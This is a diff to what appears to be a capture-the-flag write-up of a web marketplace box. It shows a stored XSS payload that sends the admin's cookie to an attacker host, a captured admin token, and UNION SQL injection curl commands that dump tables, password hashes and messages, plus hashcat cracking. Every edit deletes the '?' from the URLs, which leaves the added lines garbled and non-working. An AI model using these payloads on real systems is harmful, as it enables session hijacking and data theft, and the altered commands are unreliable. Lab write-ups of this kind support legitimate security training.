@@ -50,7 +50,7 @@ It says file upload is disabled for security reasons.
 
 ### We create an item with the following payload in the description field
 ```html
-<img src="x" onerror="fetch('http://My_IP/steal?cookie='+document.cookie)">
+<img src="x" onerror="fetch('http://My_IP/stealcookie='+document.cookie)">
 ```
 ### Then we report it
 `http://$TARGET/report/id-object`
@@ -58,14 +58,14 @@ It says file upload is disabled for security reasons.
 ### We obtain the cookie
 **Output**
 ```
-10.129.149.204 - - [25/May/2026 14:23:45] "GET /steal?cookie=token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOjIsInVzZXJuYW1lIjoibWljaGFlbCIsImFkbWluIjp0cnVlLCJpYXQiOjE3Nzk3MTkwMjZ9.LMaFek3tXVJ4hH5MSbKB2i4NPnOFFTD_QzhKiQGQZcs HTTP/1.1" 404 -
+10.129.149.204 - - [25/May/2026 14:23:45] "GET /stealcookie=token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOjIsInVzZXJuYW1lIjoibWljaGFlbCIsImFkbWluIjp0cnVlLCJpYXQiOjE3Nzk3MTkwMjZ9.LMaFek3tXVJ4hH5MSbKB2i4NPnOFFTD_QzhKiQGQZcs HTTP/1.1" 404 -
 ```
 ### We modify the cookie in our browser, and now we have access to the admin panel
 `http://10.129.149.204/admin`
 
 ### We can see user info. If the page queries the database, we can try SQL injection
 ```
-http://10.129.149.204:32768/admin?user=1%27
+http://10.129.149.204:32768/adminuser=1%27
 ```
 **Output**
 ```
@@ -74,10 +74,10 @@ error: ER_PARSE_ERROR: You have an error in your SQL syntax; check the manual th
 ### We triggered the error, now let's exfiltrate data
 ```bash
 export COOKIE="token=eyJ..."
-curl -b "$COOKIE" "http://10.129.149.204:32768/admin?user=999%20UNION%20SELECT%201,2,3,4%20--%20-"
+curl -b "$COOKIE" "http://10.129.149.204:32768/adminuser=999%20UNION%20SELECT%201,2,3,4%20--%20-"
 
 ### View current database
-curl -b "$COOKIE" "http://10.129.149.204:32768/admin?user=9999%20UNION%20SELECT%201,database(),3,4%20--%20-"
+curl -b "$COOKIE" "http://10.129.149.204:32768/adminuser=9999%20UNION%20SELECT%201,database(),3,4%20--%20-"
 ```
 ### We can only output data in the first column
 ```bash
@@ -92,9 +92,9 @@ ID: DB: marketplace | User: marketplace@172.18.0.3 | Version: 8.0.21 <br />
 ### List info
 ```bash
 ## List tables
-curl -b "$COOKIE" "http://10.129.149.204:32768/admin?user=-1%20UNION%20SELECT%20GROUP_CONCAT(table_name),2,3,4%20FROM%20information_schema.tables%20WHERE%20table_schema=database()%20--%20-"
+curl -b "$COOKIE" "http://10.129.149.204:32768/adminuser=-1%20UNION%20SELECT%20GROUP_CONCAT(table_name),2,3,4%20FROM%20information_schema.tables%20WHERE%20table_schema=database()%20--%20-"
 ## Extract users and passwords
-curl -b "$COOKIE" "http://10.129.149.204:32768/admin?user=-1%20UNION%20SELECT%20GROUP_CONCAT(CONCAT(username,':',password)),2,3,4%20FROM%20users%20--%20-"
+curl -b "$COOKIE" "http://10.129.149.204:32768/adminuser=-1%20UNION%20SELECT%20GROUP_CONCAT(CONCAT(username,':',password)),2,3,4%20FROM%20users%20--%20-"
 ```
 **Output**
 ```
@@ -122,9 +122,9 @@ hashcat -m 3200 hashes.txt /usr/share/wordlists/rockyou.txt -O
 ### While cracking, let's read the messages
 ```bash
 ## Columns
-curl -b "$COOKIE" "http://10.129.149.204:32768/admin?user=-1%20UNION%20SELECT%20GROUP_CONCAT(column_name),2,3,4%20FROM%20information_schema.columns%20WHERE%20table_name='messages'%20--%20-"
+curl -b "$COOKIE" "http://10.129.149.204:32768/adminuser=-1%20UNION%20SELECT%20GROUP_CONCAT(column_name),2,3,4%20FROM%20information_schema.columns%20WHERE%20table_name='messages'%20--%20-"
 ## Extract the info
-curl -b "$COOKIE" "http://10.129.149.204:32768/admin?user=-1%20UNION%20SELECT%20GROUP_CONCAT(CONCAT(id,':',user_from,':',user_to,':',is_read,':',message_content)%20SEPARATOR%20'|'),2,3,4%20FROM%20messages%20--%20-"
+curl -b "$COOKIE" "http://10.129.149.204:32768/adminuser=-1%20UNION%20SELECT%20GROUP_CONCAT(CONCAT(id,':',user_from,':',user_to,':',is_read,':',message_content)%20SEPARATOR%20'|'),2,3,4%20FROM%20messages%20--%20-"
 ```
 **Output**
 ```
